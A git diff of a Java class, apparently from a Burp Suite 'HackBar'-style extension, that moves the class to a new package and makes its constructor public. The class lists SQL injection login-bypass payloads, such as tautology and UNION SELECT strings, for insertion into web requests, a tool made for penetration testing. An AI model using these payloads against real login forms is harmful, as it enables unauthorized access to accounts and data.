@@ -1,10 +1,14 @@
-package burp;
+package hackbar;
 
 import java.awt.event.ActionEvent;
 import java.awt.event.ActionListener;
 import javax.swing.JMenu;
 import javax.swing.JMenuItem;
 import javax.swing.JOptionPane;
+
+import burp.BurpExtender;
+import burp.IHttpRequestResponse;
+import burp.Methods;
 
 /**
  *
@@ -22,7 +26,7 @@ public class SQli_LoginBypass extends JMenu {
         {"admin' or '1'='1", "admin' or '1'='1'--", "admin' or '1'='1'#", "admin' or '1'='1'/*", "admin'or 1=1 or ''='", "admin') or ('1'='1", "admin') or ('1'='1'/*", "1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055"},
     };
     
-    SQli_LoginBypass(BurpExtender burp){
+    public SQli_LoginBypass(BurpExtender burp){
         this.setText("SQLi:Login Bypass");
         this.myburp = burp;
         Methods.Create_Main_Menu(this, Login_Menu, LoginMenuItems, new LoginBypassItemListener(myburp));
